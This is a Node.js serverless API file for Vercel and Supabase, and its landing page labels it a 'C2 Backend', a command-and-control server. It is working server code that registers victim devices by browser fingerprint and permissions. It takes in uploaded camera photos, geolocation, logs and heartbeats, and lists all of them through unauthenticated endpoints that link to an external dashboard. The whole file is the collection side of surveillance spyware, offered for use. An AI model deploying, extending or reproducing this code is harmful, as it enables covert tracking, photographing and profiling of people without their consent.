// ============================================================
//  MINIMAL API — WITH DASHBOARD BUTTON
//  For Vercel Hobby Plan — single function
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
} else {
    console.error('Missing Supabase credentials');
}

// ============================================================
//  CORS
// ============================================================
function setCors(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    setCors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;

    console.log(`[${req.method}] ${path}`);

    // ============================================================
    //  ROOT — SHOW DASHBOARD BUTTON
    // ============================================================
    if (path === '/') {
        return res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>C2 Backend</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:48px 40px;max-width:500px;width:100%;border:1px solid #2a2a44;text-align:center;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
        .icon{font-size:64px;display:block;margin-bottom:12px}
        h1{font-size:28px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
        .sub{color:#8a8aaa;font-size:14px;line-height:1.6;margin-bottom:28px}
        .btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:16px 32px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;cursor:pointer;text-decoration:none;display:inline-block;transition:transform 0.2s,box-shadow 0.2s;box-shadow:0 8px 24px rgba(247,151,30,0.25)}
        .btn:hover{transform:scale(1.02);box-shadow:0 12px 36px rgba(247,151,30,0.35)}
        .btn:active{transform:scale(0.96)}
        .btn-secondary{background:rgba(42,42,68,0.6);border:1px solid rgba(42,42,68,0.4);color:#e0e0e0;box-shadow:none;margin-top:12px}
        .btn-secondary:hover{background:rgba(58,58,90,0.8);border-color:#f7971e;box-shadow:none}
        .endpoints{text-align:left;margin-top:24px;padding:16px;background:rgba(11,11,20,0.5);border-radius:16px;border:1px solid rgba(42,42,68,0.3);font-family:'Courier New',monospace;font-size:12px;color:#4a6a7a;line-height:1.8}
        .endpoints .highlight{color:#88ccff}
        .footer{font-size:11px;color:#4a4a6a;margin-top:20px}
    </style>
</head>
<body>
<div class="card">
    <span class="icon">☠️</span>
    <h1>C2 Backend</h1>
    <p class="sub">Your command & control server is running.</p>

    <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank" class="btn">
        📊 Open Dashboard
    </a>
    <br>
    <a href="/api/test" class="btn btn-secondary">
        🔍 Health Check
    </a>

    <div class="endpoints">
        <div><span class="highlight">POST</span> /api/register — Register device</div>
        <div><span class="highlight">POST</span> /api/photo — Upload photo</div>
        <div><span class="highlight">POST</span> /api/log — Add log</div>
        <div><span class="highlight">POST</span> /api/location — Add location</div>
        <div><span class="highlight">POST</span> /api/heartbeat — Heartbeat</div>
        <div><span class="highlight">GET</span> /api/devices — List devices</div>
        <div><span class="highlight">GET</span> /api/photos?deviceId=xxx — Get photos</div>
        <div><span class="highlight">GET</span> /api/logs?deviceId=xxx — Get logs</div>
        <div><span class="highlight">GET</span> /api/locations?deviceId=xxx — Get locations</div>
        <div><span class="highlight">GET</span> /api/test — Health check</div>
    </div>

    <p class="footer">🔐 Dashboard is password protected.</p>
</div>
</body>
</html>
        `);
    }

    // ============================================================
    //  HEALTH CHECK
    // ============================================================
    if (path === '/api/test') {
        return res.json({
            status: 'ok',
            supabase: supabase ? 'connected' : 'not configured',
            env: {
                SUPABASE_URL: supabaseUrl ? 'set' : 'missing',
                SUPABASE_KEY: supabaseKey ? 'set' : 'missing'
            },
            timestamp: new Date().toISOString()
        });
    }

    // ============================================================
    //  REGISTER DEVICE
    // ============================================================
    if (path === '/api/register' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { fingerprint, permissions } = req.body || {};
        if (!fingerprint) return res.status(400).json({ error: 'Missing fingerprint' });

        const deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);

        const { error } = await supabase
            .from('devices')
            .insert([{
                id: deviceId,
                ip: fingerprint.ip || 'unknown',
                platform: fingerprint.platform || 'unknown',
                screen: fingerprint.screen || 'unknown',
                timezone: fingerprint.timezone || 'unknown',
                cpu_cores: fingerprint.cpuCores || 'unknown',
                memory: fingerprint.deviceMemory || 'unknown',
                canvas_fp: fingerprint.canvasFingerprint || 'unknown',
                first_seen: Date.now(),
                last_seen: Date.now(),
                permissions: JSON.stringify(permissions || {})
            }]);

        if (error) {
            console.error('Register error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json({ success: true, deviceId });
    }

    // ============================================================
    //  UPLOAD PHOTO
    // ============================================================
    if (path === '/api/photo' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, image, timestamp } = req.body || {};
        if (!deviceId || !image) {
            return res.status(400).json({ error: 'Missing deviceId or image' });
        }

        try {
            let storagePath = null;
            let filePath = null;

            try {
                const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
                const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
                const fileName = `${deviceId}_${Date.now()}.${ext}`;
                const fileBuffer = Buffer.from(base64Data, 'base64');

                const { error: uploadError } = await supabase
                    .storage
                    .from('photos')
                    .upload(fileName, fileBuffer, {
                        contentType: `image/${ext}`,
                        cacheControl: '3600'
                    });

                if (!uploadError) {
                    storagePath = fileName;
                    const { data: urlData } = supabase.storage.from('photos').getPublicUrl(fileName);
                    filePath = urlData?.publicUrl || null;
                } else {
                    console.error('Upload error:', uploadError);
                }
            } catch (storageErr) {
                console.error('Storage error:', storageErr);
            }

            const { error: dbError } = await supabase
                .from('photos')
                .insert([{
                    device_id: deviceId,
                    timestamp: timestamp || Date.now(),
                    data_url: storagePath ? null : image.substring(0, 100),
                    storage_path: storagePath,
                    file_path: filePath
                }]);

            if (dbError) {
                console.error('DB error:', dbError);
                return res.status(500).json({ error: dbError.message });
            }

            await supabase
                .from('devices')
                .update({ last_seen: Date.now() })
                .eq('id', deviceId);

            return res.json({
                success: true,
                storagePath,
                filePath,
                message: storagePath ? 'Stored in Supabase Storage' : 'Stored in DB only'
            });

        } catch (e) {
            console.error('Photo error:', e);
            return res.status(500).json({ error: e.message });
        }
    }

    // ============================================================
    //  LOG
    // ============================================================
    if (path === '/api/log' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, msg, level } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        const { error } = await supabase
            .from('logs')
            .insert([{
                device_id: deviceId,
                timestamp: Date.now(),
                level: level || 'info',
                message: msg || ''
            }]);

        if (error) {
            console.error('Log error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json({ success: true });
    }

    // ============================================================
    //  LOCATION
    // ============================================================
    if (path === '/api/location' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, lat, lon, timestamp } = req.body || {};
        if (!deviceId || lat === undefined || lon === undefined) {
            return res.status(400).json({ error: 'Missing fields' });
        }

        const { error } = await supabase
            .from('locations')
            .insert([{
                device_id: deviceId,
                timestamp: timestamp || Date.now(),
                lat: lat,
                lon: lon
            }]);

        if (error) {
            console.error('Location error:', error);
            return res.status(500).json({ error: error.message });
        }

        await supabase
            .from('devices')
            .update({ last_seen: Date.now() })
            .eq('id', deviceId);

        return res.json({ success: true });
    }

    // ============================================================
    //  HEARTBEAT
    // ============================================================
    if (path === '/api/heartbeat' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { deviceId, timestamp } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        const { error } = await supabase
            .from('heartbeats')
            .insert([{
                device_id: deviceId,
                timestamp: timestamp || Date.now()
            }]);

        if (error) {
            console.error('Heartbeat error:', error);
            return res.status(500).json({ error: error.message });
        }

        await supabase
            .from('devices')
            .update({ last_seen: Date.now() })
            .eq('id', deviceId);

        return res.json({ success: true });
    }

    // ============================================================
    //  GET DEVICES
    // ============================================================
    if (path === '/api/devices' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('first_seen', { ascending: false });

        if (error) {
            console.error('Devices error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json(data || []);
    }

    // ============================================================
    //  GET PHOTOS
    // ============================================================
    if (path === '/api/photos' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId query param' });
        }

        const { data, error } = await supabase
            .from('photos')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false });

        if (error) {
            console.error('Photos error:', error);
            return res.status(500).json({ error: error.message });
        }

        const result = (data || []).map(p => {
            if (p.storage_path) {
                const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path);
                return { ...p, publicUrl: urlData?.publicUrl || null };
            }
            return p;
        });

        return res.json(result);
    }

    // ============================================================
    //  GET LOGS
    // ============================================================
    if (path === '/api/logs' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId query param' });
        }

        const { data, error } = await supabase
            .from('logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .limit(200);

        if (error) {
            console.error('Logs error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json(data || []);
    }

    // ============================================================
    //  GET LOCATIONS
    // ============================================================
    if (path === '/api/locations' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });

        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) {
            return res.status(400).json({ error: 'Missing deviceId query param' });
        }

        const { data, error } = await supabase
            .from('locations')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .limit(100);

        if (error) {
            console.error('Locations error:', error);
            return res.status(500).json({ error: error.message });
        }

        return res.json(data || []);
    }

    // ============================================================
    //  404
    // ============================================================
    return res.status(404).json({
        error: 'Not Found',
        path: path
    });
};
